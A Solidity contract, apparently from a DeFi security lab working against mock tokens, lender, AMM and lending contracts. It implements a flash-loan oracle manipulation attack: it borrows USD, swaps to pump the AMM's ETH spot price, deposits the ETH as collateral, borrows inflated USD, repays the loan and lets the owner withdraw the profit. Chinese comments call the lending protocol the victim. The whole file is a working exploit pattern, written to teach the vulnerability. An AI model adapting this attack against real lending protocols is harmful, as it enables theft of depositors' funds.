// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./D23_MockERC20.sol";
import "./FlashLenderMock.sol";
import "./SimpleAMM.sol";
import "./SpotOracleLending.sol";

/// @title AttackSpotOracle
/// @notice Flash-loan USD -> swap to ETH to pump spot price -> deposit ETH collateral -> borrow inflated USD -> repay loan+fee -> profit.
/// 借 USD（flash loan） → 大额 swap 推高 ETH spot price → 抵押 ETH → 按虚高价格借出 USD → 用借出的 USD 还 flash loan → 剩余 USD 为利润。
contract AttackSpotOracle is IFlashBorrower {
    MockERC20 public immutable usd; ///usd：借来的币 / 也是最终想薅走的币
    MockERC20 public immutable eth; /// eth：swap 得到的抵押物
    FlashLenderMock public immutable lender; /// lender：闪电贷提供方
    SimpleAMM public immutable amm; /// amm：价格可被操纵的 AMM
    SpotOracleLending public immutable lending; ///lending：受害借贷协议（用 spot price）
    address public immutable owner; /// owner：攻击合约所有者（EOA：bob）

    error NotOwner();

    constructor(
        MockERC20 _usd,
        MockERC20 _eth,
        FlashLenderMock _lender,
        SimpleAMM _amm,
        SpotOracleLending _lending
    ) {
        usd = _usd;
        eth = _eth;
        lender = _lender;
        amm = _amm;
        lending = _lending;
        owner = msg.sender;

        usd.approve(address(amm), type(uint256).max);
        eth.approve(address(lending), type(uint256).max);
    }

    function run(uint256 flashUsd, uint256 borrowUsd) external {
        if (msg.sender != owner) revert NotOwner();
        // encode desired borrow amount
        lender.flashLoan(this, flashUsd, abi.encode(borrowUsd));
    }

    function onFlashLoan(
        address /*initiator*/,
        address /*assetAddr*/,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override {
        require(msg.sender == address(lender), "only lender");
        uint256 borrowUsd = abi.decode(data, (uint256));

        // 1) Manipulate AMM spot price: swap huge USD -> ETH (USD reserve up, ETH reserve down) => ETH price in USD pumps
        usd.approve(address(amm), type(uint256).max);
        uint256 ethOut = amm.swapExactIn(address(usd), amount);

        // 2) Deposit the obtained ETH as collateral
        lending.depositEth(ethOut);

        // 3) Borrow inflated USD using pumped spot price
        lending.borrowUsd(borrowUsd);

        // 4) Repay flash loan + fee using borrowed USD
        usd.transfer(address(lender), amount + fee);

        // remaining USD (and any leftovers) is profit
    }

    function withdrawUsd(address to) external {
        if (msg.sender != owner) revert NotOwner();
        usd.transfer(to, usd.balanceOf(address(this)));
    }
}
